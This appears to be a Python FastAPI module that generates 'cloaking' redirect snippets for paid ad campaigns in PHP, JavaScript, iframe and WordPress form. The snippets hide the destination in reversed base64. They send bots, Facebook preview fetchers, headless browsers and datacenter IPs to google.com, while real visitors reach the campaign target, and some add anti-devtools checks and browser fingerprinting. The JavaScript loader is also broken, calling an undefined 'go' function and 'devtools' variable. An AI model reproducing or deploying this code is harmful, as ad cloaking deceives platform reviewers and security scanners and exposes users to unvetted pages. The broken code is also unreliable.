from fastapi import APIRouter, Depends, Request
from sqlalchemy.orm import Session
from app.database import get_db
from app.models.campaign import Campaign
import base64

router = APIRouter(prefix="/tools", tags=["Tools"])


@router.get("/script/{slug}")
def generate_script(slug: str, request: Request, db: Session = Depends(get_db)):

    # 🔥 detect domain safely
    host = (
        request.headers.get("x-forwarded-host")
        or request.headers.get("host")
        or "traffic-intelligence-saas.onrender.com"
    )

    proto = request.headers.get("x-forwarded-proto", "http")
    domain = f"{proto}://{host}"

    # 🔥 get campaign
    campaign = db.query(Campaign).filter(Campaign.slug == slug).first()

    # 🔥 safe fallback
    source = "direct"
    if campaign and campaign.traffic_source:
        source = campaign.traffic_source

    # 🔥 final redirect URL
    redirect_url = f"{domain}/r/{slug}?utm_source={source}&utm_medium=paid"

    encoded = base64.b64encode(redirect_url.encode()).decode()
    encoded = encoded[::-1]  # reverse

    # =========================
    # 🔥 AUTO MODE LOGIC
    # =========================
    mode = "hybrid"  # default

    try:
        ua = request.headers.get("user-agent", "").lower()

        # 🔥 suspicious → JS
        if "facebook" in ua or "headless" in ua or "bot" in ua or "preview" in ua:
            mode = "hybrid"

    except Exception:
        mode = "hybrid"

    return {
        "mode": mode,
        "hybrid_script": f"""<?php
// =============================
// ⚡ REAL HYBRID (FAST + STRONG)
// =============================

function _r() {{
    return base64_decode(strrev("{encoded}"));
}}

$url = _r();

$query = $_SERVER["QUERY_STRING"] ?? "";
$final = $url;

if (!empty($query)) {{
    $final .= (strpos($url, "?") !== false ? "&" : "?") . $query;
}}

// 🔥 BOT FILTER (FAST)
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
$is_bot = false;

if (!$ua || strlen($ua) < 10) {{
    $is_bot = true;
}}
elseif (preg_match('/bot|crawl|spider|facebook|preview|headless|curl|wget/i', $ua)) {{
    $is_bot = true;
}}

// 🔥 SEND SIGNAL (NON-BLOCKING)
echo "<script>
try {{
  fetch(window.location.href, {{
    method:'GET',
    headers:{{
      'x-ti-fp': navigator.userAgent,
      'x-ti-cpu': navigator.hardwareConcurrency || 0,
      'x-ti-screen': screen.width + 'x' + screen.height
    }},
    keepalive:true
  }});
}} catch(e){{}}
</script>";

// 🔥 FINAL REDIRECT (FAST)
header("Location: " . ($is_bot ? "https://www.google.com" : $final), true, 302);
exit;
?>""",
        # =========================
        # 🔥 PHP SCRIPT
        # =========================
        "php_script": f"""<?php
// =============================
// ⚡ ULTRA FAST REDIRECT ENGINE (FIXED)
// =============================

date_default_timezone_set("UTC");
ini_set("display_errors", 0);

// -----------------------------
// CONFIG
// -----------------------------
function _r() {{
    return base64_decode(strrev("{encoded}"));
}}

$url = _r();

// -----------------------------
// REQUEST DATA
// -----------------------------
$query = $_SERVER["QUERY_STRING"] ?? "";
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
$ip = $_SERVER["HTTP_CF_CONNECTING_IP"]
    ?? $_SERVER["HTTP_X_FORWARDED_FOR"]
    ?? $_SERVER["REMOTE_ADDR"] ?? "";

// -----------------------------
// ⚡ FAST BOT DETECTION (IMPROVED)
// -----------------------------
$is_bot = false;

// empty UA
if (!$ua || strlen($ua) < 10) {{
    $is_bot = true;
}}

// known bots / headless
elseif (preg_match('/bot|crawl|spider|facebook|preview|headless|curl|wget|python|java/i', $ua)) {{
    $is_bot = true;
}}

// suspicious headers missing
elseif (!isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {{
    $is_bot = true;
}}

// datacenter heuristic
elseif (strpos($ip, "66.") === 0 || strpos($ip, "34.") === 0 || strpos($ip, "35.") === 0) {{
    $is_bot = true;
}}

// -----------------------------
// ⚡ DUPLICATE CLICK PROTECTION
// -----------------------------
$hash = md5($ip . $ua);

if (!isset($_COOKIE["_ti"])) {{
    setcookie("_ti", $hash, time()+3600, "/", "", false, true);
}}

// -----------------------------
// ⚡ BUILD FINAL URL
// -----------------------------
$final = $url;

if (!empty($query)) {{
    $final .= (strpos($url, "?") !== false ? "&" : "?") . $query;
}}

// -----------------------------
// ⚡ PERFORMANCE HEADERS
// -----------------------------
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Referrer-Policy: no-referrer");
header("X-Frame-Options: SAMEORIGIN");

// -----------------------------
// ⚡ ULTRA FAST REDIRECT
// -----------------------------
if ($is_bot) {{
    header("Location: https://www.google.com", true, 302);
    exit;
}}

// 🔥 FAST REDIRECT
header("Location: " . $final, true, 302);
exit;

?>""",
        # =========================
        # 🔥 JS LOADER
        # =========================
        "js_loader": f"""<script>
(function() {{
  try {{
    if (window.__ti_done) return;
    window.__ti_done = true;

    var base = atob("{encoded}".split("").reverse().join(""));
    var q = location.search ? location.search.substring(1) : "";

    // -----------------------------
    // ⚡ BUILD FINAL URL
    // -----------------------------
    var finalUrl = base;
    if (q) {{
      finalUrl += (base.indexOf("?") !== -1 ? "&" : "?") + q;
    }}

    // -----------------------------
    // ⚡ ADVANCED BOT DETECTION
    // -----------------------------
    var ua = navigator.userAgent.toLowerCase();

    var isBotUA = /bot|crawl|spider|preview|facebookexternalhit|headless|phantom|selenium|puppeteer/.test(ua);

    var isHeadless = (
      navigator.webdriver ||
      !navigator.plugins.length ||
      !navigator.languages ||
      navigator.languages.length === 0
    );

    var isLowHardware = (
      navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2
    );

    var isNoTouch = !("ontouchstart" in window) && navigator.maxTouchPoints === 0;

    var isSuspiciousScreen = screen.width === 0 || screen.height === 0;

    var isBot = isBotUA || isHeadless || isLowHardware || isSuspiciousScreen;

    // -----------------------------
    // ⚡ COOKIE / SESSION CHECK
    // -----------------------------
    function hasCookie(name) {{
      return document.cookie.split(";").some(c => c.trim().startsWith(name + "="));
    }}

    if (!hasCookie("_ti_js")) {{
      document.cookie = "_ti_js=1; path=/";
    }}

    // -----------------------------
    // ⚡ PERFORMANCE REDIRECT
    // -----------------------------
    if (isBot || devtools) {{

  try {{
    fetch(window.location.href, {{
      method: "GET",
      headers: {{
        "x-ti-fp": navigator.userAgent,
        "x-ti-cpu": navigator.hardwareConcurrency || 0,
        "x-ti-screen": screen.width + "x" + screen.height
      }},
      keepalive: true
    }});
  }} catch(e) {{}}

  window.location.replace("https://www.google.com");
  return;
}}

    // -----------------------------
    // ⚡ DELAY (ANTI BOT TRICK)
    // -----------------------------
    var delay = isBot ? 10 : 30;

    setTimeout(function() {{
      if (isBot) {{
        go("https://www.google.com");
      }} else {{
        go(finalUrl);
      }}
    }}, delay);

  }} catch (e) {{
    window.location.replace("{redirect_url}");
  }}
        }});
</script>""",
        # =========================
        # 🔥 IFRAME
        # =========================
        "iframe_cloak": f"""<iframe 
src=""
id="ti_frame"
style="border:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;background:#fff;"
referrerpolicy="no-referrer"
sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation-by-user-activation"
loading="eager"
></iframe>

<script>
(function() {{
  try {{
    if (window.__ti_iframe) return;
    window.__ti_iframe = true;

    var frame = document.getElementById("ti_frame");
    var ua = navigator.userAgent.toLowerCase();

    // -----------------------------
    // ⚡ ADVANCED BOT DETECTION
    // -----------------------------
    var isBotUA = /bot|crawl|spider|preview|facebookexternalhit|headless|phantom|selenium|puppeteer/.test(ua);

    var isHeadless = (
      navigator.webdriver ||
      !navigator.plugins.length ||
      !navigator.languages ||
      navigator.languages.length === 0
    );

    var isWeirdScreen = screen.width === 0 || screen.height === 0;

    var isBot = isBotUA || isHeadless || isWeirdScreen;
    frame.src = atob("{encoded}".split("").reverse().join(""));

    // -----------------------------
    // ⚡ ANTI-DEBUG / ANTI-DEVTOOLS
    // -----------------------------
    var devtools = false;
    setInterval(function() {{
      if (window.outerWidth - window.innerWidth > 200 ||
          window.outerHeight - window.innerHeight > 200) {{
        devtools = true;
      }}
    }}, 500);

    // -----------------------------
    // ⚡ FALLBACK CHECK
    // -----------------------------
    function fallback() {{
      window.location.replace("{redirect_url}");
    }}

    // -----------------------------
    // ⚡ BOT HANDLING
    // -----------------------------
    if (isBot || devtools) {{
      window.location.replace("https://www.google.com");
      return;
    }}

    // -----------------------------
    // ⚡ IFRAME LOAD CHECK (FAST)
    // -----------------------------
    var loaded = false;

    frame.onload = function() {{
      loaded = true;
    }};

    setTimeout(function() {{
      if (!loaded) {{
        fallback();
      }}
    }}, 1200);

    // -----------------------------
    // ⚡ USER INTERACTION BOOST
    // -----------------------------
    document.addEventListener("click", function() {{
      frame.style.zIndex = "9999";
    }});

  }} catch(e) {{
    window.location.replace("{redirect_url}");
  }}
}})();
</script>
""",
        # =========================
        # 🔥 WORDPRESS
        # =========================
        "wordpress_snippet": f"""add_action('template_redirect', function() {{

    // -----------------------------
    // ⚡ BASIC SAFETY
    // -----------------------------
    if (is_admin() || wp_doing_ajax() || wp_doing_cron()) return;

    if (strpos($_SERVER['REQUEST_URI'], '/r/') !== false) return;

    // -----------------------------
    // ⚡ CONFIG
    // -----------------------------
    $url = '{redirect_url}';

    // -----------------------------
    // ⚡ REQUEST DATA
    // -----------------------------
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['REMOTE_ADDR'] ?? '';

    // -----------------------------
    // ⚡ ADVANCED BOT DETECTION
    // -----------------------------
    $is_bot = false;

    // empty / short UA
    if (!$ua || strlen($ua) < 10) {{
        $is_bot = true;
    }}

    // known bots / tools
    elseif (preg_match('/bot|crawl|spider|facebook|preview|headless|curl|wget|python|java/i', $ua)) {{
        $is_bot = true;
    }}

    // missing headers (suspicious)
    elseif (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {{
        $is_bot = true;
    }}

    // datacenter heuristic
    elseif (strpos($ip, '66.') === 0 || strpos($ip, '34.') === 0 || strpos($ip, '35.') === 0) {{
        $is_bot = true;
    }}

    // -----------------------------
    // ⚡ QUERY STRING PRESERVE
    // -----------------------------
    if (!empty($_SERVER['QUERY_STRING'])) {{
        $url .= (strpos($url, '?') !== false ? '&' : '?') . $_SERVER['QUERY_STRING'];
    }}

    // -----------------------------
    // ⚡ COOKIE (SESSION CONTROL)
    // -----------------------------
    if (!isset($_COOKIE['_ti_wp'])) {{
        setcookie('_ti_wp', md5($ip.$ua), time()+3600, '/', '', false, true);
    }}

    // -----------------------------
    // ⚡ PERFORMANCE HEADERS
    // -----------------------------
    nocache_headers();
    header("Referrer-Policy: no-referrer");

    // -----------------------------
    // ⚡ REDIRECT LOGIC
    // -----------------------------
    if ($is_bot) {{
        wp_safe_redirect('https://www.google.com', 302);
        exit;
    }}

    // 🔥 FAST REDIRECT
    wp_safe_redirect($url, 302);
    exit;

}});""",
    }
